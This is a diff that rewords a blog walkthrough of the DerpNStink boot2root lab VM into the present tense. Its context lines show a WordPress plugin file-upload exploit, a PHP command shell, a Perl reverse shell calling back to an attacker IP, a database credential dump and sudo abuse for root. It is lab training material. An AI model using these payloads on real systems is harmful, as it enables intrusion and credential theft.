@@ -18,7 +18,7 @@ This post documents the complete walkthrough of DerpNStink: 1, a boot2root [VM][
 
 ### Background
 
-Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...
+Mr. Derp and Uncle Stinky are two system administrators starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decide to hack together their own system which is almost ready to go live…
 
 ### Information Gathering
 
@@ -44,11 +44,11 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: DeRPnStiNK
 ```
 
-My usual game plan is to target the web service first whenever `nmap` tells me that `robots.txt` exists. Let's start with that.
+My usual game plan is to target the web service first whenever `nmap` tells me `robots.txt` exists. Let's start with that.
 
 ### HTML Source
 
-Using `curl` and some `grep`-fu on the HTML source, I captured the first flag. Easy.
+I capture the first flag using `curl` and some `grep`-fu on the HTML source. Easy.
 
 ```
 # curl -s 192.168.10.130 | grep -P 'href=|src=|<!?--' | sed -r 's/^\s+//'
@@ -67,7 +67,7 @@ Using `curl` and some `grep`-fu on the HTML source, I captured the first flag. E
 
 ### Web Notes
 
-Something else was there as well: `/webnotes`
+There's something else out there as well — `/webnotes`
 
 ```
 # curl http://192.168.10.130/webnotes/
@@ -150,7 +150,7 @@ PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
 stinky@DeRPnStiNK:~$
 ```
-From above, I noted the following:
+From above, I'm able to infer the following information:
 
 * The FQDN of the host is `derpnstink.local`; and
 * User `stinky` exists; and
@@ -158,7 +158,7 @@ From above, I noted the following:
 
 ### Directory/File Enumeration
 
-Using `gobuster` with one of the big wordlists for a quick enumeration, I found these  directories.
+Using `gobuster` with one of the big wordlists for a quick enumeration, I'm able to find these directories.
 
 ```
 Gobuster v1.2                OJ Reeves (@TheColonial)
@@ -179,9 +179,9 @@ http://192.168.10.130/temporary (Status: 301)
 =====================================================
 ```
 
-Both `/php` and `/temporary` were already listed in `robots.txt`.
+Both `/php` and `/temporary` are already in `robots.txt`.
 
-Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists), I found more directories.
+Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists), I'm able to find more directories.
 
 ```
 http://192.168.10.130/php/info.php (Status: 200)
@@ -192,7 +192,7 @@ http://192.168.10.130/weblog/wp-content (Status: 301)
 http://192.168.10.130/weblog/wp-includes (Status: 301)
 ```
 
-It appeared that `/weblog` is the root directory for WordPress. As such, there is a need to place the FQDN in my hosts file as shown here.
+It appears that `/weblog` is the root directory for WordPress. There's a need to place the FQDN in `/etc/hosts`.
 
 ```
 curl -i 192.168.10.130/weblog/
@@ -205,7 +205,7 @@ Location: http://derpnstink.local/weblog/
 Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ```
-There was also another hint from `/webnotes/info.txt` to do likewise.
+There's another hint from `/webnotes/info.txt` to do likewise.
 
 ```
 <-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->
@@ -213,7 +213,7 @@ There was also another hint from `/webnotes/info.txt` to do likewise.
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan` to enumerate vulnerable WordPress plugins, this particular version (1.4.6) had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
+Using `wpscan` to identify vulnerable WordPress plugins, I was able to find this particular version (1.4.6), has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
 I wrote `upload.sh`, a `bash` script to upload files based on the vulnerability.
 
@@ -260,7 +260,7 @@ curl \
 rm -rf cookie
 {% endhighlight %}
 
-I uploaded a simple PHP file that executes remote command with the script.
+I upload a simple PHP file that executes remote command, with the script.
 
 ```
 # cat cmd.php
@@ -271,13 +271,13 @@ I uploaded a simple PHP file that executes remote command with the script.
 
 ### Low Privilege Shell
 
-Now that I've uploaded the file, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
+After I upload the file, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
 
 ```perl
 perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-Since we are passing the above command to `cmd.php`, it's best to `urlencode` it to avoid complications. The entire URL looked like this.
+Since we are passing the above command to `cmd.php`, it's best to `urlencode` it to avoid complications. The entire URL looks like this.
 
 ```
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
@@ -317,7 +317,7 @@ Let's proceed to dump and view the database.
 $ mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
 ```
 
-The **second flag** and **password hashes** stood out from the dump.
+The **second flag** and **password hashes** stick out from the dump like a sore thumb.
 
 ```
 'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'
@@ -339,7 +339,7 @@ admin:admin:::::
 ```
 ### Getting to South Park
 
-Remember that we are still in the low-privileged shell? And since `/etc/passwd` is world-readable, let's enumerate the users in the host.
+Remember that we are still in the low-privileged shell? And since `/etc/passwd` is world-readable, let's determine the users in the host.
 
 ```
 $ cat /etc/passwd
@@ -351,13 +351,13 @@ ftp:x:118:126:ftp daemon,,,:/srv/ftp:/bin/false
 mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
 ```
 
-Let's see if we can login to Uncle Stinky's account with the password (`wedgie57`).
+Let's see if we can log in to Uncle Stinky's account with the password (`wedgie57`).
 
 ![screenshot-4](/assets/images/posts/derpnstink-walkthrough/screenshot-4.png)
 
-During enumeration of Uncle Stinky's account, I discovered the third flag at `/home/stinky/Desktop/flag.txt`.
+During enumeration of Uncle Stinky's account, I discover the third flag at `/home/stinky/Desktop/flag.txt`.
 
-Enumerating further, I uncovered a conversation between Mr. Derp and Uncle Stinky. It appeared that Mr. Derp couldn't login to WordPress and Uncle Stinky has captured some network traffic to assist in troubleshooting the issue.
+Enumerating further, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears Mr. Derp can't login to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
 
 ```
 $ cd ~/ftp/files/network-logs
@@ -385,11 +385,11 @@ log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=htt
 log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
 log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
 ```
-Let's login to Mr. Derp's account with the password (`derpderpderpderpderpderpderp`) recovered from the packet capture.
+Let's login to Mr. Derp's account with the password (`derpderpderpderpderpderpderp`) we recover from the packet capture.
 
 ![screenshot-5](/assets/images/posts/derpnstink-walkthrough/screenshot-5.png)
 
-I uncovered a helpdesk ticket during the enumeration of Mr. Derp's account. Apparently, Mr. Derp had an issue with `sudoer`.
+I uncover a helpdesk ticket during the enumeration of Mr. Derp's account. Apparently, Mr. Derp has an issue with `sudoer`.
 
 ```
 $ cd /support
@@ -415,7 +415,7 @@ Thank you for using our product.
 ********************************************************************
 ```
 
-I found the resolution at `https://pastebin.com/RzK9WfGw`.
+The resolution is at `https://pastebin.com/RzK9WfGw`.
 
 ![screenshot-6](/assets/images/posts/derpnstink-walkthrough/screenshot-6.png)
 
@@ -432,13 +432,13 @@ $ chmod +x /home/mrderp/binaries/derpy
 $ sudo /home/mrderp/binaries/derpy
 ```
 
-And since we already knew the password to Mr. Derp's account.
+And since we already know the password to Mr. Derp's account.
 
 ![screenshot-7](/assets/images/posts/derpnstink-walkthrough/screenshot-7.png)
 
 Boom.
 
-I discovered the fourth flag at `/root/Desktop/flag.txt`.
+The fourth flag is at `/root/Desktop/flag.txt`.
 
 :dancer:
 
